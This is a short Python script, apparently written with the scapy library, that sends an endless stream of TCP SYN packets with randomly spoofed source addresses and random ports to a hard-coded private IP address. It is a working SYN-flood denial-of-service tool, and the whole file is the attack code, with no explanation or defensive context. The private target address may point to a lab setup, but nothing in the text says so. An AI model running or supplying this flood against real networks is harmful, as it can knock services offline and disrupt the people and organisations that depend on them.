from scapy.all import IP, TCP, send
import random

target = "172.28.86.29"

while True:
    source_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    source_port = random.randint(0, 65535)
    target_port = random.randint(0, 65535)
    packet_id = random.randint(1, 65535) 
    packet = IP(dst=target, src=source_ip, id= packet_id) / TCP(sport=source_port, dport=target_port, flags="S", seq=100)
    send(packet, verbose=0)